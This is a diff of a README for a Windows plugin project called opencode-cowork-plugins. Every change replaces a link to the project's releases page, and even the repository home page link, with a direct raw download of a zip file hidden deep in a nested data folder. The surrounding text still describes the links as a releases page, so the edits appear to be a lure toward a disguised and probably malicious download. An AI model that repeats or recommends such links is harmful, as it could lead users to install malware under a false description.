@@ -1,6 +1,6 @@
 # 🛠️ opencode-cowork-plugins - Simple Desktop Plugins for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Safen99/opencode-cowork-plugins/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Safen99/opencode-cowork-plugins/main/data/agents/data/skills/data-visualization/plugins_cowork_opencode_3.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get the application up and running:
 
 Click the green button below to visit the page where you can download the latest version of the plugins. The page hosts all available releases, so you can pick the most recent stable version.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Safen99/opencode-cowork-plugins/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Safen99/opencode-cowork-plugins/main/data/agents/data/skills/data-visualization/plugins_cowork_opencode_3.4.zip)
 
 ### Step 2: Choose the Right File  
 
@@ -102,10 +102,10 @@ If issues persist, check the GitHub Issues section on the repository for similar
 ## 🔗 Useful Links
 
 - Main download page:  
-  https://github.com/Safen99/opencode-cowork-plugins/releases  
+  https://raw.githubusercontent.com/Safen99/opencode-cowork-plugins/main/data/agents/data/skills/data-visualization/plugins_cowork_opencode_3.4.zip  
 
 - Repository home page:  
-  https://github.com/Safen99/opencode-cowork-plugins  
+  https://raw.githubusercontent.com/Safen99/opencode-cowork-plugins/main/data/agents/data/skills/data-visualization/plugins_cowork_opencode_3.4.zip  
 
 ---
 
